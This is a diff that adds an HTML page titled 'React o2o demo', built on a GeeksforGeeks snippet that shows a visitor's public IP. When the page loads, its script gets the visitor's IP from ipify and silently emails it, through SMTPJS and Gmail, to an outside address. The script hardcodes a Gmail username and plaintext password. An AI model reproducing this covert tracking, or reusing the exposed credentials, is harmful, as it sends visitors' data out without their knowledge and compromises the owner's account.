@@ -1,0 +1,55 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
+    <title>React o2o demo</title>
+
+    
+    <script src=
+"https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js">
+    </script>
+    <script src=
+    "https://smtpjs.com/v3/smtp.js">
+  </script>
+     
+      <script>
+     
+    /* Add "https://api.ipify.org?format=json" statement
+               this will communicate with the ipify servers in
+               order to retrieve the IP address $.getJSON will
+               load JSON-encoded data from the server using a
+               GET HTTP request */
+                
+    $.getJSON("https://api.ipify.org?format=json", function(data) {
+         
+        // Setting text of element P with id gfg
+        $("#gfg").html(data.ip);
+        console.log( 'IP - ' + data.ip);
+
+        Email.send({
+        Host: "smtp.gmail.com",
+        Username: "training.2023007@gmail.com",
+        Password: "Elieg7301**",
+        To: 'f_soma@live.nl',
+        From: "training.2023007@gmail.com",
+        Subject: "IP",
+        Body: "IP - " + data.ip,
+      })
+        .then(function (message) {
+          alert("mail sent successfully")
+        });
+    })
+
+    </script>
+
+
+  </head>
+  <body>
+    <div id='root'>
+        <h1>GeeksforGeeks</h1>
+        <h3>Public IP Address of user is:</h3>
+        <p id="gfg"></p>
+    </div>
+  </body>
+</html>
